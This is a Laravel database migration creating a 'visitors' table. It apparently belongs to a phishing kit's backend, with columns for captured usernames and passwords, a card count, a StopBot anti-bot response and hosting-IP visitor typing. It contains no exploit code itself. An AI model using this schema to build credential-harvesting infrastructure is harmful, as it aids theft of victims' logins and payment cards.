<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration {
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('visitors', static function (Blueprint $table) {
            $table->id();
            $table->string('user')->nullable();
            $table->string('pass')->nullable();
            $table->unsignedInteger('card_count')->default(0);
            $table->boolean('is_finished')->default(false);
            $table->enum('parameter_status', ['matched', 'unmatched']);
            $table->string('stopbot_response')->nullable();
            $table->string('browser');
            $table->enum('user_type', ['CableDsl', 'Residential', 'Business', 'Cellular', 'Hosting', 'Undetected'])->default('Undetected');
            $table->string('isp')->default('');
            $table->string('city')->default('');
            $table->string('state')->default('');
            $table->string('country')->default('');
            $table->ipAddress()->unique();
            $table->string('user_agent')->default('');
            $table->string('first_page');
            $table->string('last_page');
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('visitors');
    }
};
